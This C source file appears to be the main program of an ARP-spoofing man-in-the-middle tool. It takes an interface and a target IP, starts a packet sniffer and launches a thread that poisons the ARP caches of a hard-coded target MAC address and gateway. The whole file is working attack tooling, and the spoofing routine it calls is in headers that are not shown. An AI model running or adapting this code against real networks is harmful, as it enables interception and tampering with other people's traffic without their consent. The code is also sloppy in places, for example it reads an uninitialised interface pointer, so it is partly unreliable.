#include<unistd.h>
#include<pthread.h>
#include <sys/socket.h>
#include"common.h"
#include"arp.h"
#include"sniffer.h"
#include"getif.h"
#include"print.h"

bool debug=false;
void usage(){
	printf("MITM usage:\n"
		"  -h = show this help test\n"
		"  -d = increase debugging verbosity\n"
		"  -i = interface name\n"
		"  -l = list all available interface\n");
}

int main(int argc,char* argv[]){
	int c ,exitcode;

	u_char ATTACKER_MAC[6];
	u_char TARGET_MAC[6]={0xd0,0xc5,0xd3,0x26,0x36,0x77};
	u_char ATTACKER_IP[4];
	u_char TARGET_IP[4];//={192,168,43,127};
	u_char GATEWAY_IP[4]={192,168,43,1};
	
	sni_info dev_info;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t* if_buf;
	char* usr_dev;
	for(;;){
		c=getopt(argc, argv,"i:hdl");
		if(c < 0)break;
		switch(c){
			case 'h':
				usage();
				goto out;
			break;
			case 'd':
				debug=true;
			break;
			case 'i':
				usr_dev = optarg;
			break;
			case 'l':
				if(!if_buf){
					if(getifinfo(&if_buf,errbuf)){
                                        	exitcode = 10;
						goto out;
					}
				}
				while(if_buf->next){
                                                printf("%s\n",if_buf->name);
                                                if_buf = if_buf->next;
				}
				return 0;
			break;
			default:
		       		usage();
				goto out;	
		}
	}

	pthread_t t;
	//the thread of arp_spoof need to be detached or joinable?
	pthread_attr_t a;
	pthread_attr_init(&a);
	pthread_attr_setdetachstate(&a,PTHREAD_CREATE_DETACHED);
	
	if(getifinfo(&if_buf,errbuf)){
		exitcode = 10;
		goto out;
	}
	if(!checkdevice(if_buf,usr_dev)){
		exitcode = 11;
		goto out;
	}
	/* sniffer init */
	dev_info.dev=usr_dev;
	if(sniffer_init(&dev_info,errbuf)){
		exitcode = 10;
		goto out;
	}
	
	printf("please key in target's ip\n");
	scanf("%hhd.%hhd.%hhd.%hhd",&TARGET_IP[0],&TARGET_IP[1],&TARGET_IP[2],&TARGET_IP[3]);

        MITM_info info={
                .TARGET_MAC=TARGET_MAC,
                .ATTACKER_MAC=dev_info.attacker_mac,
                .GATEWAY_MAC=dev_info.gateway_mac,
                .TARGET_IP=TARGET_IP,
                .GATEWAY_IP=GATEWAY_IP,
        //	.dev = usr_dev,
	};
        strcpy(info.dev,usr_dev);
	/* init fake arp and the return value should be the next input to send_fake_arp op */
	pthread_create(&t,NULL,arp_spoof,&info);
	pthread_join(t,NULL);
	
	return 0;

out :
	switch(exitcode){
		case 10:
			printf("can't find device info,please run by superuser again\n");
		break;
		case 11:
			printf("can't find specify interface,please check by flag 'l'\n");
		break;
	}
	return -1;
}
